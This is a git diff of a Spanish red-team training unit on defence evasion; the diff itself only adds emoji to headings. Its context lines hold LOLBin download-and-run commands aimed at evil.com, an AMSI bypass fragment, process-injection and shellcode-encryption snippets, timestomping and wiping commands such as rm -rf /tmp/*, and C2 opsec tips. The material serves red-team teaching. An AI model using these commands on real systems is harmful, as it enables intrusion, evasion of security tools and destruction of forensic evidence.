@@ -1,6 +1,6 @@
-# Unidad 6: Evasión de Defensas
+# 🛡️ Unidad 6: Evasión de Defensas
 
-## Objetivos de Aprendizaje
+## 🎯 Objetivos de Aprendizaje
 
 - **Bypassear** soluciones EDR y antivirus.
 - **Ejecutar** técnicas de ocultación y process injection.
@@ -9,13 +9,13 @@
 
 ---
 
-## Contenido Teórico
+## 📚 Contenido Teórico
 
-### 6.1 EDR Evasion
+### 🔓 6.1 EDR Evasion
 
 Los Endpoint Detection and Response (EDR) monitorizan actividad en endpoints para detectar amenazas. El bypass requiere técnicas especializadas.
 
-#### Living Off the Land Binaries (LOLBins)
+#### 💻 Living Off the Land Binaries (LOLBins)
 
 Utilizar binarios legítimos del sistema para ejecutar acciones maliciosas.
 
@@ -44,7 +44,7 @@ bitsadmin /transfer myjob https://evil.com/payload.exe %TEMP%\payload.exe
 IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
 ```
 
-#### DLL Hijacking
+#### 🦴 DLL Hijacking
 
 Vulnerabilidad cuando una aplicación busca DLLs en ubicaciones inseguras.
 
@@ -74,7 +74,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
 }
 ```
 
-#### Process Injection
+#### 💉 Process Injection
 
 Inyectar código en procesos legítimos del sistema.
 
@@ -113,7 +113,7 @@ WriteProcessMemory(..., shellcode, ...);
 ResumeThread(threadHandle);
 ```
 
-#### AMSI Bypass
+#### 🚫 AMSI Bypass
 
 Antimalware Scan Interface (AMSI) es una interfaz de Windows que permite a antivirus escanear en memoria.
 
@@ -141,9 +141,9 @@ $am.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 ---
 
-### 6.2 Antivirus Bypass
+### 🔬 6.2 Antivirus Bypass
 
-#### Obfuscation
+#### 🎭 Obfuscation
 
 **PowerShell obfuscation**:
 ```powershell
@@ -172,7 +172,7 @@ Import-Module .\Invoke-Obfuscation.psd1
 Invoke-Obfuscation
 ```
 
-#### Encryption
+#### 🔐 Encryption
 
 **AES Encryption**:
 ```python
@@ -192,7 +192,7 @@ cipher = arc4 ARC4(key)
 encrypted = cipher.encrypt(shellcode)
 ```
 
-#### Packers
+#### 📦 Packers
 
 Comprimen y ofuscan ejecutables.
 
@@ -206,9 +206,9 @@ upx -d payload_packed.exe  # Descomprimir
 
 ---
 
-### 6.3 Antiforense
+### 🕵️ 6.3 Antiforense
 
-#### Timestomping
+#### ⏰ Timestomping
 
 Modificar timestamps de archivos para evadir detección forense.
 
@@ -231,7 +231,7 @@ set TIMESTOMP_OPTION modify
 (Get-Item file.exe).LastWriteTime = "01/01/2020 00:00:00"
 ```
 
-#### Artifact Wiping
+#### 🧹 Artifact Wiping
 
 Eliminar evidencia del sistema.
 
@@ -255,7 +255,7 @@ del /q /f /s %TEMP%\*.*
 rm -rf /tmp/*
 ```
 
-#### Memory Forensics Evasion
+#### 🧠 Memory Forensics Evasion
 
 **Evitar Volatility**:
 - Evitar archivos en disco
@@ -269,18 +269,18 @@ rm -rf /tmp/*
 
 ---
 
-### 6.4 OpSec
+### 🔒 6.4 OpSec
 
 Operational Security protege la identidad y operaciones del Red Team.
 
-#### Principios de OpSec
+#### 📋 Principios de OpSec
 
 1. **Segregar identidades**: Separar identidades de operación de identidades personales
 2. **Minimizar footprints**: Dejar la menor evidencia posible
 3. **Rotar infraestructura**: Cambiar frecuentemente servidores C2
 4. **No confiar en defensores**: Asumir que pueden detectarte
 
-#### C2 Communications
+#### 📡 C2 Communications
 
 **Protección de tráfico**:
 - Usar HTTPS con certificados legítimos
@@ -302,7 +302,7 @@ void delay() {
 }
 ```
 
-#### Covering Tracks
+#### 👣 Covering Tracks
 
 **Después de cada operación**:
 1. Eliminar herramientas usadas
@@ -312,7 +312,7 @@ void delay() {
 
 ---
 
-## Herramientas
+## 🛠️ Herramientas
 
 | Herramienta | Propósito | Instalación |
 |-------------|-----------|-------------|
@@ -327,7 +327,7 @@ void delay() {
 
 ---
 
-## Laboratorio
+## 🔬 Laboratorio
 
 > Ver [`labs/lab-unidad6.md`](../labs/lab-unidad6.md) para el escenario completo.
 
@@ -341,7 +341,7 @@ void delay() {
 
 ---
 
-## Recursos Adicionales
+## 📚 Recursos Adicionales
 
 - [LOLBAS Project](https://lolbas-project.github.io/) — catálogo exhaustivo de binarios, scripts y librerías legítimas de Windows abusables por atacantes
 - [AMSI.fail](https://amsi.fail/) — generador de bypasses AMSI ofuscados, útil para comprobar la robustez de detección en entornos Windows
@@ -352,7 +352,7 @@ void delay() {
 
 ---
 
-## Bibliografía
+## 📖 Bibliografía
 
 - [LOLBAS Project](https://lolbas-project.github.io/)
 - [AMSI.fail](https://amsi.fail/)
